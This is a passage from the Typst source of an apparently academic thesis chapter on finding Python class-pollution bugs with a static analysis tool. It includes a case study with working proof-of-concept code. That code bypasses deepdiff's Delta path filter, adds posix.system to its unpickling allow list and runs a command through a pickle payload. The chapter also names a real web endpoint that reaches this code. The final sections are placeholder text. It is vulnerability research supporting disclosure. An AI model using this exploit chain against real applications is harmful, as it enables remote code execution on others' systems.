  kind: raw,
)

With regards to the _Not Vulnerable_ issues, there were many reasons for them
to be deemed not vulnerable, as shown in @fg:not-vuln-issue-reasons.
An issue can have one or more reasons for not being considered vulnerable,
with the most common ones being that there was only a single call to `getattr`
(_Not Recursive_, #not_vulnerable_issues_reasons.at("NonRecursive") issues),
that the return value of `getattr` would be modified in some way before
reaching `setattr`
(_Modified Reference_, #not_vulnerable_issues_reasons.at("ModifiedReference") issues),
or that the keys passed to `getattr` or `setattr` were not controlled by function
inputs (_Not Controlled_, #not_vulnerable_issues_reasons.at("NotControlled") issues).
For the purposes of this experiment, code that unconditionally performed a function
call while traversing has been marked with _Modified Reference_,
even if technically that could be part of a successful exploit,
since it would be introducing too much complexity and deviating
from the classic class pollution described in @bg:lit-review.

Unsurprisingly, very few issues had already some kind of filtering in place
to prevent accessing dunder properties such as `__globals__`
(_Filtered_, #not_vulnerable_issues_reasons.at("Filtered") issues).

Finally, #not_vulnerable_issues_reasons.at("Other") issues were marked with _Other_
since they were not vulnerable but the reason did not match any of the aforementioned
criteria.
These issues required all traversed objects to be of a certain class or to
contain a certain method, which would be unfeasible for class pollution.

#figure(
  caption: [Visualisation of the reasons why issues were deemed not vulnerable,
    discriminated by platform of the respective project.],
)[
  #let all_features = (
    "Other": [Other],
    "Filtered": [Filtered],
    "NotControlled": [Not Controlled],
    "NonRecursive": [Not Recursive],
    "ModifiedReference": [Modified Reference],
  )
  #let x_pypi = all_features.keys().map(feat => not_vulnerable_pypi_issues_reasons.at(feat, default: 0))
  #let y_pypi = range(all_features.len())
  #let x_gh = all_features.keys().map(feat => not_vulnerable_gh_issues_reasons.at(feat, default: 0))
  #let y_gh = range(all_features.len())

  #lq.diagram(
    width: 10cm,
    height: 5.5cm,
    legend: (position: right + bottom),
    margin: (right: 10%),
    xlabel: [Number of Issues],
    xaxis: (exponent: none),
    yaxis: (
      ticks: all_features.values().enumerate(),
      subticks: none,
    ),

    lq.hbar(
      x_pypi,
      y_pypi,
      offset: -0.2,
      width: 0.4,
      fill: pypi_color,
      label: [@pypi],
    ),
    lq.hbar(
      x_gh,
      y_gh,
      offset: 0.2,
      width: 0.4,
      fill: gh_color,
      label: [GitHub],
    ),

    ..x_pypi
      .zip(y_pypi)
      .map(((x, y)) => {
        lq.place(x, y - 0.2, pad(0.2em, [#x]), align: left)
      }),
    ..x_gh
      .zip(y_gh)
      .map(((x, y)) => {
        lq.place(x, y + 0.2, pad(0.2em, [#x]), align: left)
      }),
  )
] <fg:not-vuln-issue-reasons>

// TODO code examples for non-vulnerable reasons (?)

To sum up, #TheTool managed to detect a few vulnerable projects, and a very small
number of them show high chance of exploitation.
However, there was also a large number of false positives, which slows down detection
due to the manual labor required to filter them out.

== Case Study: Vulnerable Library <results:case-study>

#let format_project_link(project) = {
  let platform = project.at("platform")
  let name = project.at("name")
  if platform == "PyPI" {
    link("https://pypi.org/project/" + name)[#name]
  } else if platform == "GitHub" {
    link("https://github.com/" + name)[#name]
  } else {
    name
  }
}

#let deepdiff_project = raw_data.find(project => project.at("name") == "deepdiff")
#let deepdiff_issues = extract_issues((deepdiff_project,))
#let deepdiff_vulnerable_issues = filter_list(deepdiff_issues, by_is_issue_vulnerable)
#let deepdiff_not_vulnerable_issues = filter_list(deepdiff_issues, by_is_issue_vulnerable, inv: true)

#box(
  fill: red.lighten(50%),
  stroke: 3pt + red,
  width: 100%,
  inset: 1em,
)[
  *WARNING* (2025-08-30): the vulnerabilities in this section are still being
  responsibly disclosed.
  For ethical (and legal) reasons, *avoid sharing this document* and spreading
  the information below before they are made public by the affected projects.
]

Building on the results of the previous section, a few selected projects were
manually audited to see if any of them would be exploitable.
Since this is a very time-consuming process, only projects that had the most
likelihood of being exploitable were considered, that is, those that had at least
an issue with both the _Dict Access_ and _Supports `__setitem__`_ features.
Only #case_study_considered.len() projects met this criteria:
#case_study_considered.map(format_project_link).join(", ", last: ", and ").
While the latter two did not reveal any obvious exploitation paths, the *deepdiff*
package was found to be exploitable and contain an @rce gadget as well.

*deepdiff* is a Python library that recursively calculates the difference between
two objects or pieces of data, and also provides methods to apply the resulting
diffs to existing objects.
The project has around #format_popularity(deepdiff_project.at("popularity"))
downloads on @pypi, 2.4k stars on GitHub, and approximately 18k dependent repositories,
according to GitHub statistics @deepdiff-dependents.

#TheTool detected #deepdiff_issues.len() issues on *deepdiff*,
#deepdiff_vulnerable_issues.len() of which _Vulnerable_ and
#deepdiff_not_vulnerable_issues.len() _Not Vulnerable_.
While the issues mostly pointed to the Delta feature of the library,
none of them actually represent the piece of exploitable code.
Likely due to a function of the vulnerable code path being called
through a variable, as shown in @code:deepdiff-get-nested-obj-var,
Pysa failed to detect the exact code path that leads to class pollution.

#figure(
  caption: [Part of the exploitable code path gets assigned to the
    `self.get_nested_obj` attribute, failing detection by Pysa],
  [
    #set text(size: 9pt)
    #codly.codly(
      skips: ((5, 44), (6, 3), (7, 17), (10, 72)),
      header: box(height: 6pt)[`deepdiff/delta.py`],
      footer: [from @pypi package *deepdiff* at version 8.6.0],
      offset: 17,
      highlighted-lines: (164, 166),
    )
    ```py
    from deepdiff.path import (
        _path_to_elements, _get_nested_obj, _get_nested_obj_and_force,
        GET, GETATTR, parse_path, stringify_path,
    )
    class Delta:
        def __init__(
            force: bool=False,
            fill: Any=not_found,
        ):
            if force:
                self.get_nested_obj = _get_nested_obj_and_force
            else:
                self.get_nested_obj = _get_nested_obj

    ```
    #codly.codly(
      header: box(height: 6pt)[`deepdiff/path.py`],
      footer: [from @pypi package *deepdiff* at version 8.6.0],
      offset: 117,
    )
    ```py
    def _get_nested_obj(obj, elements, next_element=None):
        for (elem, action) in elements:
            if action == GET:
                obj = obj[elem]
            elif action == GETATTR:
                obj = getattr(obj, elem)
        return obj
    ```
  ],
) <code:deepdiff-get-nested-obj-var>

This `get_nested_obj` function is then called in various parts of the `Delta`
class, and in certain cases, its return value is passed to the
`_simple_set_elem_value` function's `value` parameter,
which contains a `setattr` (and `__setitem__`) sink,
as shown in @code:deepdiff-simple-set-elem-value.

#figure(
  caption: [Sink that can be used to set the value of an attribute or
    a dictionary entry],
  [
    #set text(size: 9pt)
    #codly.codly(
      skips: ((2, 213), (21, 1), (24, 1)),
      header: box(height: 6pt)[`deepdiff/delta.py`],
      footer: [from @pypi package *deepdiff* at version 8.6.0],
      offset: 65,
      highlighted-lines: (287, 301),
    )
    ```py
    class Delta:
        def _simple_set_elem_value(self, obj, path_for_err_reporting, elem=None, value=None, action=None):
            """
            Set the element value directly on an object
            """
            try:
                if action == GET:
                    try:
                        obj[elem] = value
                    except IndexError:
                        if elem == len(obj):
                            obj.append(value)
                        elif self.fill is not not_found and elem > len(obj):
                            while len(obj) < elem:
                                if callable(self.fill):
                                    obj.append(self.fill(obj, value, path_for_err_reporting))
                                else:
                                    obj.append(self.fill)
                            obj.append(value)
                        else:
                elif action == GETATTR:
                    setattr(obj, elem, value)  # type: ignore
                else:
            except (KeyError, IndexError, AttributeError, TypeError) as e:
    ```
  ],
) <code:deepdiff-simple-set-elem-value>

Something that stands out in both of these functions is the `action`
variable, which seems to control whether to perform the access using
`getattr`/`setattr` or `__getitem__`/`__setitem__`.
Reading deepdiff's documentation and examples reveals that the `Delta`
class commonly takes a `DeepDiff` object as an argument, which provides
it with, amongst other details, a paths in a string form, such as
`root.['foo'].bar`.
This information is stored internally by `Delta` in its `diff` attribute
as a Python dictionary.
@code:deepdiff-delta-usage shows the expected usage of the library,
including applying the delta to an object.

#figure(
  caption: [Common usage of `Delta`, where it is given the result of `DeepDiff`
    and then applied to an object],
  [
    #set text(size: 9pt)
    ```py
    from deepdiff import Delta, DeepDiff

    class Foo:
        def __init__(self, bar):
            self.bar = bar

    a = {"foo": Foo("qux")}
    b = {"foo": Foo("baz")}
    diff = DeepDiff(a, b)
    delta = Delta(diff)
    c = a + delta
    assert c["foo"].bar == "baz"

    print(delta.diff)
    # {'values_changed': {"root['foo'].bar": {'new_value': 'baz'}}}
    ```
  ],
) <code:deepdiff-delta-usage>

Another feature of the `Delta` class is that it also accepts a dictionary
in that same format as an argument, no `DeepDiff` class required.
While it seems this would allow for class pollution by changing the path to
traverse `__globals__`, it appears that the library skips
any attributes starting with `__` when parsing the given path, making
the exploit fail, as shown in @code:deepdiff-delta-string-path.

#figure(
  caption: [Using dunder attributes in the path given to `Delta` does not work],
  [
    #set text(size: 9pt)
    #codly.codly(offset: 9)
    ```py
    PWNED = False
    delta = Delta(
        {
          "values_changed": {
            "root['foo'].__init__.__globals__.PWNED": {"new_value": "baz"}
          }
        }
    )
    # Fails with: Unable to get the item at root['foo'].__init__.__globals__.PWNED
    c = a + delta
    print(PWNED) # Prints False
    ```
  ],
) <code:deepdiff-delta-string-path>

Upon further investigation, it appears that there is a way to bypass this restriction
by providing the path in the internal representation used by `Delta` instead of
as a string, as the parsing function has an early return if the path is already
a list or tuple.
Paths are represented by a list of tuples with 2 elements, one for the name
of the attribute/key, and another one for the previously mentioned action.
Therefore, it is possible to use, for example, `('__globals__', 'GETATTR')`,
to access the `__globals__` attribute.
@code:deepdiff-delta-tuple-path shows a working example of class pollution
by taking advantage of this path parsing behaviour.
It is worth noting that a tuple was used instead of a list, since lists cannot
be used as keys of a dictionary, and it still works for the purposes of the
exploit.

#figure(
  caption: [Polluting global variables by using using
    `Delta`'s internal path representation instead],
  [
    #set text(size: 9pt)
    #codly.codly(offset: 9)
    ```py
    PWNED = False
    delta = Delta(
        {
            "values_changed": {
                (
                    ("root", "GETATTR"),
                    ("foo", "GET"),
                    ("__init__", "GETATTR"),
                    ("__globals__", "GETATTR"),
                    ("PWNED", "GET"),
                ): {"new_value": "baz"}
            }
        }
    )
    c = a + delta
    print(PWNED) # Prints baz
    ```
  ],
) <code:deepdiff-delta-tuple-path>

=== Gadgets

Another relevant feature of the `Delta` class is its ability to be
serialised and deserialised via Python's `pickle`
#footnote[#link("https://docs.python.org/3/library/pickle.html")] module.
While this would normally be a huge security risk, as noted by Python's
own documentation, deepdiff restricts the allowed classes and accessible
globals to mitigate this security this.
For that reason, deepdiff defines an allow list at
`deepdiff.serialization.SAFE_TO_IMPORT`,
which contains expected classes like `builtins.dict`, but also other classes
like `re.Pattern` and `deepdiff.helper.Opcode`.
If a class like `posix.system` is added to this allow list, the app becomes
vulnerable to @rce through unpickling user-controlled data @pickle-rce.

In addition to the already shown `values_changed` action, the `Delta` class
also supports various other actions, such as `set_item_added`,
`dictionary_item_added`, `attribute_added`, and many others.
These actions are applied to the target object in a predefined order,
with `values_changed` being the first, and the others following in the
same order as they were presented in the previous sentence.
For modifying the `SAFE_TO_IMPORT`, which is of type `set`, the
`set_item_added` action must be used, as shown in
@code:deepdiff-modifying-safe-to-import by taking advantage of the
existing import of the `Delta` class to traverse to `SAFE_TO_IMPORT`.

#figure(
  caption: [Polluting `SAFE_TO_IMPORT` by adding `posix.system` to the
    unpickling allow list],
  [
    #set text(size: 9pt)
    #codly.codly(offset: 9)
    ```py
    delta = Delta(
        {
            "set_item_added": {
                (
                    ("root", "GETATTR"),
                    ("foo", "GET"),
                    ("__init__", "GETATTR"),
                    ("__globals__", "GETATTR"),
                    ("Delta", "GET"),
                    ("__init__", "GETATTR"),
                    ("__globals__", "GETATTR"),
                    ("pickle_load", "GET"),
                    ("__globals__", "GETATTR"),
                    ("SAFE_TO_IMPORT", "GET"),
                ): set(["posix.system"])
            },
        }
    )
    c = a + delta

    from deepdiff.serialization import SAFE_TO_IMPORT
    print("posix.system" in SAFE_TO_IMPORT) # Prints True
    ```
  ],
) <code:deepdiff-modifying-safe-to-import>

As previously mentioned, when `posix.system` is in the allow list,
it becomes possible to exploit the pickle deserialiser to
gain @rce in the system running the Python application @pickle-rce.
Given that `Delta` also accepts input as a `bytes` object, which
it then unpickles, it is possible to serialise a malicious class
as `bytes` and the pass it to `Delta`, as shown in @code:deepdiff-rce.

#figure(
  caption: [Using pickle to achieve #gls-shrt("rce"), bypassing protections
    in place by deepdiff],
  [
    #set text(size: 9pt)
    #codly.codly(offset: 29)
    ```py
    import os
    import pickle
    class RCE:
        def __reduce__(self):
            cmd = 'echo 1337 > /tmp/pwned'
            return os.system, (cmd,)
    payload = pickle.dumps({'_': RCE()})
    print(payload) # Prints b'\x80\x04\x958\x00...'

    # in the vulnerable application...
    Delta(payload)
    ```
    ```sh
    $ cat /tmp/pwned
    1337
    ```
  ],
) <code:deepdiff-rce>

To conclude, deepdiff contains both a class pollution vulnerability and
the necessary gadgets to perform @rce, as long as two calls
are made to `Delta` with user-controlled input.

=== Vulnerable Application

Upon completing a proof of concept exploit, GitHub was searched for repositories
that used the affected `Delta` class.
One repository, *lsst-dm/cm-service*
#footnote(link("https://github.com/lsst-dm/cm-service"))
immediately stood out as a potential candidate,
as it allowed user input to flow into the `Delta` class.

*cm-service* is a Python web service, built and used for the
Rubin Observatory#footnote(link("https://rubinobservatory.org/"))
for campaign management.
It uses FastAPI, a modern web framework to build APIs with Python.

One of the endpoints, `PATCH /cm-service/v2/manifests/{name}`, accepts
binary data as POST data, which then flows directly into
the `Delta` class.
This `Delta` object is then applied to a dictionary, and saved
into the database, as shown in @code:cm-service-http.

#figure(
  caption: [HTTP endpoint that accepts binary data, passed directly
    into the `Delta` class],
  [
    #set text(size: 9pt)
    #codly.codly(
      skips: ((7, 4), (9, 20), (15, 25), (16, 11)),
      header: box(height: 6pt)[`src/lsst/cmservice/routers/v2/manifests.py`],
      footer: [from GitHub repository *lsst-dm/cm-service* at revision f551e2b],
      offset: 185,
      highlighted-lines: (264,),
    )
    ```py
    @router.patch(
        "/{manifest_name_or_id}",
        summary="Update manifest detail",
        status_code=202,
    )
    async def update_manifest_resource(
        patch_data: Annotated[bytes, Body()] | Sequence[JSONPatch],
    ) -> Manifest:
        use_rfc6902 = False
        use_deepdiff = False
        if request.headers["Content-Type"] == "application/json-patch+json":
            use_rfc6902 = True
        elif request.headers["Content-Type"] == "application/octet-stream":
            use_deepdiff = True
        if use_rfc6902:
        elif use_deepdiff:
            if TYPE_CHECKING:
                assert isinstance(patch_data, bytes)
            new_manifest["spec"] += Delta(patch_data)
    ```
  ],
) <code:cm-service-http>

Given that `new_manifest["spec"]` is a dictionary, it would normally not
be possible to traverse to a gadget, as outlined in @bg:cp-limitations.
However, since `Delta` allows unpickling the aforementioned allow listed
classes, it is possible to first assign one of those classes, and then
use it to traverse to the `SAFE_TO_IMPORT` gadget.
One of the available classes is `deepdiff.helper.Opcode`, defined in the
`helper.py` file which helpfully imports the `sys` module.
A particularity of the `sys` module is that it has a `modules`
dictionary that contains a reference to every module already loaded by the
application, allowing easy traversal to `deepdiff.serialization`.
Therefore, a possible exploit, that can lead to @rce, is to first set a
value to `Opcode` and then use that to traverse to and modify
`SAFE_TO_IMPORT` to include `posix.system`.
After that, another request can be made to trigger @rce via
the pickle exploit already shown in @code:deepdiff-rce.
For ethical reasons, the full exploit will not be shown for this production
application.

To conclude, it has become clear from the results that the vulnerability that
was found, with the help of #TheTool, has been proven to be exploitable in
real-world applications.

== Tool Tweaks <results:tweaks>

#text(fill: red, lorem(50))

=== Installing Dependencies <results:install-deps>

#text(fill: red, lorem(50))

=== User Controlled Taint <results:user-controlled-taint>

#text(fill: red, lorem(50))

=== Calls to getattr Count <results:getattr-count>

#text(fill: red, lorem(50))
